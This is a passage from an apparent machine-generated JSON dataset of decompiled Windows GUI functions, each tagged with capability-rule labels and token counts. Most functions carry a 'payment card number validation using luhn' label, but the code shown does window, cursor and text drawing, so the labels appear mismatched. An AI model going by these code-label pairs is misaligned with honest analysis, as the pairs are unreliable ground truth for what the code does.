        "decompiled_code": "\nvoid __fastcall fcn.0043ab0c(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint uVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar2 = fcn.00402b14();\n    *puVar2 = param_2;\n    uVar3 = fcn.0043aae0(&stack0xfffffffc);\n    puVar2[1] = uVar3;\n    cVar1 = fcn.0043aaa8();\n    if (cVar1 == '\\0') {\n        fcn.0041c358();\n    }\n    else {\n        fcn.0041c54c();\n    }\n    return;\n}\n",
        "token_count": 165
    },
    "0043ac9c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043ac9c(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd0;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x43ad66;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    iVar1 = *param_2;\n    if (iVar1 < 0x216) {\n        if (iVar1 == 0x215) {\n            puStack32 = &stack0xfffffffc;\n            fcn.0043bdd0();\n        }\n        else if (iVar1 == 0x200) {\n            puStack32 = &stack0xfffffffc;\n            fcn.004075f8();\n            in_stack_ffffffd0 = *0x485ad0;\n            sub.user32.dll_ClientToScreen(*0x485ad0, &var_ch);\n            fcn.0043b758();\n        }\n        else if ((iVar1 == 0x202) || (iVar1 == 0x205)) {\n            puStack32 = &stack0xfffffffc;\n            fcn.0043bdd0();\n        }\n    }\n    else if (iVar1 == 0xbd00) {\n        if (param_2[1] == 0x11) {\n            fcn.0043b758();\n        }\n        else if (param_2[1] == 0x1b) {\n            param_2[3] = 1;\n            puStack32 = &stack0xfffffffc;\n            fcn.0043bdd0();\n        }\n    }\n    else if ((iVar1 == 0xbd01) && (param_2[1] == 0x11)) {\n        puStack32 = &stack0xfffffffc;\n        fcn.0043b758();\n    }\n    *in_FS_OFFSET = in_stack_ffffffd0;\n    return;\n}\n",
        "token_count": 464
    },
    "0043ae30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043ae30(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint unaff_retaddr;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    *(in_EAX + 0x38) = param_1;\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = unaff_retaddr;\n    }\n    return;\n}\n",
        "token_count": 156
    },
    "0043c0f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0043c0f4(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint arg_8h;\n    uint uStack24;\n    \n    iVar1 = fcn.0043c0c0();\n    iVar3 = 0;\n    if (iVar1 != 0) {\n        arg_8h = 0;\n        fcn.0043d38c();\n        iVar2 = fcn.00441930(arg_8h);\n        iVar3 = iVar1;\n        if (iVar2 != 0) {\n            iVar3 = iVar2;\n        }\n    }\n    return CONCAT44(uStack24, iVar3);\n}\n",
        "token_count": 154
    },
    "0043c184": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0043c184(void)\n\n{\n    sub.gdi32.dll_GetWindowOrgEx();\n    sub.gdi32.dll_SetWindowOrgEx();\n    return;\n}\n",
        "token_count": 38
    },
    "0043c1b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0043c1b4(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puStack24 = 0x43c1c4;\n    var_8h = fcn.0041c8b0();\n    uStack28 = 0x43c264;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if (-1 < *(var_8h + 8) + -1) {\n        var_4h = 0;\n        puStack24 = &stack0xfffffffc;\n        var_ch = *(var_8h + 8);\n        do {\n            puStack36 = 0x43c1f6;\n            var_10h = fcn.0041c4c8();\n            puStack36 = 0x43c201;\n            cVar1 = fcn.00426ee8();\n            if (cVar1 != '\\0') {\n                uStack40 = 0x43c23d;\n                uStack44 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffd4;\n                puStack36 = &stack0xfffffffc;\n                fcn.0043c3f0();\n                fcn.0040406c();\n                fcn.0040406c();\n                return;\n            }\n            var_4h = var_4h + 1;\n            var_ch = var_ch + -1;\n        } while (var_ch != 0);\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x43c26b;\n    uStack28 = 0x43c263;\n    fcn.0041c914();\n    return;\n}\n",
        "token_count": 449
    },
    "0043c468": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0043c468(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    fcn.004037f0();\n    *(in_EAX + 4) = param_1;\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 166
    },
    "0043ca20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0043ca20(void)\n\n{\n    int32_t *arg_8h;\n    char extraout_DL;\n    \n    arg_8h = fcn.00403bc0();\n    fcn.0045c0a0();\n    if ((arg_8h[0x28] == 0) || ((*(arg_8h[0x28] + 0x1c) & 8) != 0)) {\n        (**(*arg_8h + 0x68))();\n    }\n    else {\n        fcn.0043e9fc(arg_8h);\n        (**(*arg_8h + 0x68))();\n        fcn.0043d1e8();\n        fcn.00403a28();\n        arg_8h[0x28] = 0;\n    }\n    fcn.00403820();\n    arg_8h[0x1b] = 0;\n    fcn.00403820();\n    fcn.00403820();\n    fcn.004094f0();\n    fcn.00422788();\n    if ('\\0' < extraout_DL) {\n        fcn.00403ba8();\n    }\n    return;\n}\n",
        "token_count": 263
    },
    "0043d1e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043d1e8(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    \n    *param_2 = *(in_EAX + 0x40);\n    param_2[1] = *(in_EAX + 0x44);\n    param_2[2] = *(in_EAX + 0x40) + *(in_EAX + 0x48);\n    param_2[3] = *(in_EAX + 0x44) + *(in_EAX + 0x4c);\n    return;\n}\n",
        "token_count": 131
    },
    "0043d24c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0043d24c(void)\n\n{\n    int32_t *in_EAX;\n    uint uStack12;\n    \n    (**(*in_EAX + 0x44))();\n    return uStack12;\n}\n",
        "token_count": 49
    },
    "0043d264": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0043d264(void)\n\n{\n    fcn.0043d290();\n    fcn.0041b058();\n    fcn.0043d6d4();\n    return;\n}\n",
        "token_count": 45
    },
    "0043d290": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0043d290(void)\n\n{\n    int32_t *in_EAX;\n    uint uStack8;\n    \n    (**(*in_EAX + 0x44))();\n    return uStack8;\n}\n",
        "token_count": 48
    },
    "0043d2a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0043d2a8(void)\n\n{\n    fcn.0043d24c();\n    fcn.0041b058();\n    fcn.0043d6d4();\n    return;\n}\n",
        "token_count": 48
    },
    "0043d360": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043d360(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iStack20;\n    int32_t iStack16;\n    \n    (**(*in_EAX + 0x40))();\n    *param_1 = *param_2 + iStack20;\n    param_1[1] = param_2[1] + iStack16;\n    return;\n}\n",
        "token_count": 105
    },
    "0043d38c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043d38c(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iStack20;\n    int32_t iStack16;\n    \n    (**(*in_EAX + 0x40))();\n    *param_1 = *param_2 - iStack20;\n    param_1[1] = param_2[1] - iStack16;\n    return;\n}\n",
        "token_count": 106
    },
    "0043d6d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043d6d4(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iStack20;\n    int32_t iStack16;\n    \n    iVar1 = *param_2;\n    iVar2 = param_2[1];\n    (**(*in_EAX + 0x44))(iVar1, iVar2);\n    (**(*in_EAX + 0x84))((in_EAX[0x13] - iStack16) + iVar2, (in_EAX[0x12] - iStack20) + iVar1);\n    return;\n}\n",
        "token_count": 156
    },
    "0043e728": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nchar __fastcall fcn.0043e728(uint param_1, uint *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uchar *arg_8h;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uchar auStack28 [16];\n    \n    uVar3 = *param_2;\n    uVar4 = param_2[1];\n    uVar5 = param_2[2];\n    uVar6 = param_2[3];\n    if (*(in_EAX + 0xa0) != 0) {\n        cVar1 = fcn.00403a28(uVar3, uVar4, uVar5, uVar6);\n        if (cVar1 == '\\0') {\n            cVar1 = '\\0';\n            goto code_r0x0043e75c;\n        }\n    }\n    cVar1 = '\\x01';\ncode_r0x0043e75c:\n    if (cVar1 != '\\0') {\n        iVar2 = fcn.0043f5b4();\n        if (iVar2 == 0) {\n            fcn.00403a28(uVar3, uVar4, uVar5, uVar6);\n        }\n        else {\n            uVar3 = fcn.0043d290();\n            arg_8h = auStack28;\n            fcn.0043d24c();\n            fcn.0041b080(arg_8h, uVar3);\n            fcn.00403a28();\n        }\n    }\n    return cVar1;\n}\n",
        "token_count": 361
    },
    "0043e8c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043e8c8(uint param_1, int32_t param_2)\n\n{\n    uint uStack16;\n    \n    sub.user32.dll_GetCursorPos();\n    fcn.0043d38c();\n    *param_2 = param_2;\n    *(param_2 + 4) = uStack16;\n    return;\n}\n",
        "token_count": 80
    },
    "0043e9fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043e9fc(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (in_EAX != 0) {\n        (**(in_EAX + 0x38))();\n    }\n    return 0;\n}\n",
        "token_count": 86
    },
    "0043ed3c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043ed3c(uint param_1, int32_t *param_2)\n\n{\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = 0x43ed00;\n    fcn.0043ed0c(&stack0xfffffffc);\n    (**(*param_2 + 4))(uVar1);\n    return;\n}\n",
        "token_count": 92
    },
    "0043ee50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043ee50(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t in_EDX;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x51) & 0x10) == 0) {\n        if ((*(in_EAX + 0x48) < 0x8001) && (*(in_EAX + 0x4c) < 0x8001)) {\n            fcn.00454370(*(in_EDX + 10), *(in_EDX + 8));\n            fcn.00403a28();\n        }\n        else {\n            fcn.0043e8c8();\n            fcn.00454370(var_4h, var_8h);\n            fcn.00403a28();\n        }\n    }\n    return;\n}\n",
        "token_count": 195
    },
    "0043f5b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0043f5b4(uint param_1, uint *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    uVar3 = 0;\n    iVar1 = (**(*in_EAX + 0x58))(*param_2, param_2[1], param_2[2], param_2[3]);\n    if (iVar1 != 0) {\n        iVar1 = (**(*in_EAX + 0x58))();\n        iVar2 = fcn.00403764();\n        if (iVar1 != iVar2) {\n            iVar1 = (**(*in_EAX + 0x58))();\n            uVar3 = (**(iVar1 + 0x2c))();\n            fcn.0043cfdc();\n            fcn.0043cfb8();\n            fcn.0043d264();\n            fcn.0043d2a8();\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 231
    },
    "0043f9f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0043f9f0(uint param_1, int32_t param_2)\n\n{\n    double *in_EAX;\n    double *pdVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    iVar2 = 0;\n    if (0 < param_2) {\n        iVar3 = 1;\n        pdVar1 = in_EAX;\n        do {\n            pdVar1 = pdVar1 + 1;\n            if (*pdVar1 < in_EAX[iVar2]) {\n                iVar2 = iVar3;\n            }\n            iVar3 = iVar3 + 1;\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    return iVar2;\n}\n",
        "token_count": 176
    },
    "0043fd64": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0043fd64(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    code **in_FS_OFFSET;\n    code *pcVar2;\n    code *pcStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_8h;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        puStack40 = 0x43fd7d;\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    uStack44 = 0x43fe5c;\n    pcStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &fcn.0043fd64::var_1h + 1;\n    var_1h._0_1_ = param_2;\n    fcn.0043c948();\n    pcVar2 = fcn.00441800;\n    uVar1 = fcn.00423e04(fcn.00441800, in_EAX);\n    *(in_EAX + 0x18c) = uVar1;\n    uVar1 = fcn.0042675c();\n    *(in_EAX + 0x170) = uVar1;\n    fcn.00426904();\n    *(in_EAX + 0x1a9) = 1;\n    *(in_EAX + 0x1a0) = 0xffffffff;\n    *(in_EAX + 0x184) = 3;\n    if (*(*0x484858 + 4) == 0x11) {\n        fcn.004045c8();\n    }\n    else {\n        fcn.0045b178();\n        fcn.0040461c();\n    }\n    *(in_EAX + 0x1a7) = 0;\n    *(in_EAX + 0x162) = *0x43fe84;\n    *(in_EAX + 0x163) = 2;\n    *(in_EAX + 0x164) = 1;\n    *(in_EAX + 0x168) = 1;\n    *(in_EAX + 0x150) = 1;\n    *in_FS_OFFSET = pcVar2;\n    pcStack48 = 0x43fe63;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 569
    },
    "00440904": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00440904(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.004037f0();\n    arg_8h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    fcn.0043d24c();\n    iVar2 = fcn.00440d74();\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar3 = fcn.00440d38();\n            if (*(iVar3 + 4) == *(in_EAX + 4)) {\n                fcn.00440d38();\n                fcn.0041c358();\n                fcn.0043cfb8();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    iVar1 = *(iVar1 + 8);\n    if (-1 < iVar1 + -1) {\n        do {\n            arg_8h = 0;\n            fcn.0041c4c8();\n            fcn.0043e9fc(arg_8h);\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = arg_8h;\n    fcn.00403820();\n    return;\n}\n",
        "token_count": 335
    },
    "00440d74": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00440d74(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = 0;\n    if (*(in_EAX + 0x198) != 0) {\n        iVar1 = *(*(in_EAX + 0x198) + 8);\n    }\n    if (*(in_EAX + 0x19c) != 0) {\n        iVar1 = iVar1 + *(*(in_EAX + 0x19c) + 8);\n    }\n    return iVar1;\n}\n",
        "token_count": 124
    },
    "00440dd4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00440dd4(uint param_1, ushort param_2)\n\n{\n    fcn.00440d94(param_2, 0, 0, 0);\n    return;\n}\n",
        "token_count": 47
    },
    "00441384": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00441384(uint param_1, int32_t *param_2)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.0043ed3c();\n    uVar2 = 0x44120c;\n    uVar1 = 0x441244;\n    uVar3 = in_EAX;\n    fcn.004412ac(&stack0xfffffffc);\n    (**(*param_2 + 4))(uVar1, in_EAX, uVar2, uVar3);\n    return;\n}\n",
        "token_count": 148
    },
    "00441580": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00441580(uint arg_8h)\n\n{\n    uint var_10h;\n    \n    return;\n}\n",
        "token_count": 29
    },
    "00441cc4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __fastcall fcn.00441cc4(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = fcn.0043a70c();\n    if (iVar1 != 0) {\n        uVar2 = fcn.0043e9fc(*(param_2 + 8));\n        *(param_2 + 0xc) = uVar2;\n    }\n    return iVar1 != 0;\n}\n",
        "token_count": 108
    },
    "00443a30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00443a30(int32_t arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint var_3ch;\n    uint lpwndpl;\n    uint var_10h;\n    \n    if ((((in_EDX == *(in_EAX + 0x40)) && (in_ECX == *(in_EAX + 0x44))) && (arg_ch == *(in_EAX + 0x48))) &&\n       (arg_8h == *(in_EAX + 0x4c))) {\n        return;\n    }\n    cVar1 = fcn.00444380();\n    if ((cVar1 == '\\0') || (iVar2 = sub.user32.dll_IsIconic(*(in_EAX + 0x180)),  iVar2 != 0)) {\n        *(in_EAX + 0x40) = in_EDX;\n        *(in_EAX + 0x44) = in_ECX;\n        *(in_EAX + 0x48) = arg_ch;\n        *(in_EAX + 0x4c) = arg_8h;\n        cVar1 = fcn.00444380();\n        if (cVar1 != '\\0') {\n            lpwndpl = 0x2c;\n            sub.user32.dll_GetWindowPlacement(*(in_EAX + 0x180), &lpwndpl);\n            fcn.0043d1e8();\n            sub.user32.dll_SetWindowPlacement();\n        }\n    }\n    else {\n        sub.user32.dll_SetWindowPos(*(in_EAX + 0x180), 0);\n    }\n    fcn.0043ce9c();\n    fcn.00403a28();\n    return;\n}\n",
        "token_count": 404
    },
    "00443b08": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00443b08(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00440d74(param_2, param_1);\n    if (-1 < iVar1 + -1) {\n        do {\n            fcn.00440d38();\n            fcn.00403a28();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 108
    },
    "00443f84": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00443f84(void)\n\n{\n    int32_t in_EAX;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar auStack20 [16];\n    \n    puStack32 = &stack0xffffffec;\n    uStack24 = 0x443f93;\n    fcn.0043d1e8();\n    uStack24 = 1;\n    uStack28 = 1;\n    sub.user32.dll_InflateRect();\n    sub.user32.dll_InvalidateRect(*(*(in_EAX + 0x30) + 0x180), &stack0xffffffe0, 0xffffffff);\n    return;\n}\n",
        "token_count": 147
    },
    "0044438c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0044438c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iStack116;\n    uchar *puStack112;\n    int32_t iStack108;\n    uchar *puStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack60;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    \n    uStack76 = *(in_EAX + 0x180);\n    puStack80 = 0x4443a0;\n    iVar1 = sub.user32.dll_IsIconic();\n    if (iVar1 == 0) {\n        uStack84 = *(in_EAX + 0x180);\n        uStack88 = 0x4443d6;\n        puStack80 = &stack0xffffffb4;\n        sub.user32.dll_GetWindowRect();\n    }\n    else {\n        uStack60 = 0x2c;\n        puStack80 = &stack0xffffffc4;\n        uStack84 = *(in_EAX + 0x180);\n        uStack88 = 0x4443bd;\n        sub.user32.dll_GetWindowPlacement();\n        uStack84 = uStack40;\n        puStack80 = puStack36;\n        uStack76 = uStack32;\n        uStack72 = uStack28;\n    }\n    uStack88 = 0xfffffff0;\n    uStack92 = *(in_EAX + 0x180);\n    uStack96 = 0x4443e4;\n    uVar2 = sub.user32.dll_GetWindowLongA();\n    if ((uVar2 & 0x40000000) != 0) {\n        uStack96 = 0xfffffff8;\n        uStack100 = *(in_EAX + 0x180);\n        puStack104 = 0x4443f9;\n        iVar1 = sub.user32.dll_GetWindowLongA();\n        if (iVar1 != 0) {\n            sub.user32.dll_ScreenToClient();\n            sub.user32.dll_ScreenToClient();\n            iStack116 = iVar1;\n            puStack112 = &stack0xffffff9c;\n            iStack108 = iVar1;\n            puStack104 = &stack0xffffff9c;\n        }\n    }\n    *(in_EAX + 0x40) = iStack116;\n    *(in_EAX + 0x44) = puStack112;\n    *(in_EAX + 0x48) = iStack108 - iStack116;\n    *(in_EAX + 0x4c) = puStack104 - puStack112;\n    fcn.0043ce9c();\n    return;\n}\n",
        "token_count": 632
    },
    "00444620": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00444620(code *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_EDX;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00440d74();\n    if (-1 < iVar1 + -1) {\n        do {\n            iVar2 = fcn.00440d38();\n            if (*(iVar2 + 4) == in_EDX) {\n                (*arg_8h)();\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 148
    },
    "004454c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004454c4(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint uStack16;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    uStack16 = 0x4454d5;\n    var_4h = in_EAX;\n    uStack16 = fcn.0044407c();\n    puStack20 = 0x4454db;\n    var_8h = sub.user32.dll_GetWindowDC();\n    uStack24 = 0x44551a;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    (**(*var_4h + 0xcc))();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x445521;\n    uStack24 = var_8h;\n    uStack28 = 0x445513;\n    uStack28 = fcn.0044407c();\n    sub.user32.dll_ReleaseDC();\n    return;\n}\n",
        "token_count": 259
    },
    "00445528": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00445528(void)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x4455c1;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    (**(*in_EAX + 0x44))();\n    var_10h = var_10h + 2;\n    var_ch = var_ch + 2;\n    fcn.00426138();\n    uVar1 = fcn.0043fb70();\n    fcn.0043d848(0xffffffff, &var_10h, uVar1 | 0x810);\n    uVar2 = fcn.00404a88();\n    uVar2 = fcn.0042704c(uVar2);\n    sub.user32.dll_DrawTextA();\n    *in_FS_OFFSET = uVar2;\n    fcn.004045c8(0x4455c8);\n    return;\n}\n",
        "token_count": 282
    },
    "004458bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004458bc(void)\n\n{\n    int32_t *in_EAX;\n    uint var_10h;\n    \n    (**(*in_EAX + 0xd0))();\n    return;\n}\n",
        "token_count": 45
    },
    "004458e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004458e4(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint var_4h;\n    \n    fcn.0041b080(arg_8h, 0);\n    uVar1 = fcn.0043fb70();\n    uVar2 = fcn.00404a88(0xffffffff, arg_8h, uVar1 | 0xc10);\n    uVar2 = fcn.0042704c(uVar2);\n    sub.user32.dll_DrawTextA(uVar2);\n    *(arg_8h + 8) = *(arg_8h + 8) + 6;\n    *(arg_8h + 0xc) = *(arg_8h + 0xc) + 2;\n    return;\n}\n",
        "token_count": 183
    },
    "004459d0": {
        "rules": [
